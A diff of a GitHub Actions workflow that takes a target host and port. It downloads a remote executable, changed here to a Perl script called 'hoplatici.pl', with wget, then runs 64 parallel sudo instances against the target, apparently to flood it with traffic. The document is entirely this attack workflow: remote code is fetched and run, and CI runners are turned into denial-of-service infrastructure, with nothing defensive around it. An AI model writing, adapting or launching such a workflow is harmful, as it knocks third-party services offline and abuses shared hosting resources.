@@ -1,4 +1,4 @@
-name: Tekil !
+name: Tekil2 !
 
 on:
   workflow_dispatch:
@@ -29,12 +29,12 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O Tekil
-          chmod +x Tekil || true
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/hoplatici.pl -O Hoplatici.pl
+          chmod +x Hoplatici.pl || true
 
           PIDS=()
           for i in {1..64}; do
-            sudo timeout 30 ./Tekil "$TARGET" "$PORT" &
+            sudo timeout 30 perl Hoplatici.pl "$TARGET" "$PORT" 1400 30 &
             PIDS+=($!)
           done
 
